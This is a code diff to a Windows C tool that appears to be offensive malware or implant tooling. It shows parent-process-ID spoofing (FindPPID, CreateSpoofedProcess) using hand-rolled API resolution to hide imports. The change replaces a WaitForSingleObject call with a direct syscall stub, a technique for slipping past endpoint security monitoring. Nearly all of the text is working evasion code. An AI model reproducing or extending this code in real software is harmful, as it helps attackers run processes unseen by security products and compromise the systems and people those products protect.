@@ -1,4 +1,5 @@
 #include "common.h"
+#include "syscalls.h"
 
 BOOL FindPPID(IN LPWSTR sProcessName, OUT HANDLE* hParent, OUT DWORD* dwProcessID)
 {
@@ -12,6 +13,7 @@ BOOL FindPPID(IN LPWSTR sProcessName, OUT HANDLE* hParent, OUT DWORD* dwProcessI
 	HANDLE hProcSnapshot = NULL;
 	PROCESSENTRY32 pProcess = { .dwSize = sizeof(PROCESSENTRY32) };
 	hProcSnapshot = rCreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
+
 
 	rProcess32First(hProcSnapshot, &pProcess);
 	// Get parent handle
@@ -41,7 +43,6 @@ BOOL FindPPID(IN LPWSTR sProcessName, OUT HANDLE* hParent, OUT DWORD* dwProcessI
 BOOL CreateSpoofedProcess(IN HANDLE hParentProcess, IN LPCSTR lpProcessName, OUT DWORD* dwProcessId, OUT HANDLE* hProcess, OUT HANDLE* hThread)
 {
 	// Dynamic Links
-	f_WaitForSingleObject rWaitForSingleObject = GetProcAddressReplacement(GetModuleHandleReplacement(L"kernel32.dll"), "WaitForSingleObject");
 	f_GetEnvironmentVariableA rGetEnvironmentVariableA = GetProcAddressReplacement(GetModuleHandleReplacement(L"kernel32.dll"), "GetEnvironmentVariableA");
 	f_CreateProcessA rCreateProcessA = GetProcAddressReplacement(GetModuleHandleReplacement(L"kernel32.dll"), "CreateProcessA");
 
@@ -72,6 +73,7 @@ BOOL CreateSpoofedProcess(IN HANDLE hParentProcess, IN LPCSTR lpProcessName, OUT
 
 	// Create process with spoofed params
 	SiEx.lpAttributeList = pThreadAttList;
+
 	rCreateProcessA(
 		NULL,
 		lpPath,
@@ -84,7 +86,7 @@ BOOL CreateSpoofedProcess(IN HANDLE hParentProcess, IN LPCSTR lpProcessName, OUT
 		&SiEx.StartupInfo,
 		&Pi
 	);
-	rWaitForSingleObject(hThread, 1000);
+	Sw3NtWaitForSingleObject(Pi.hThread, FALSE, 1000);
 
 	// Returns and cleanup
 	*dwProcessId = Pi.dwProcessId;
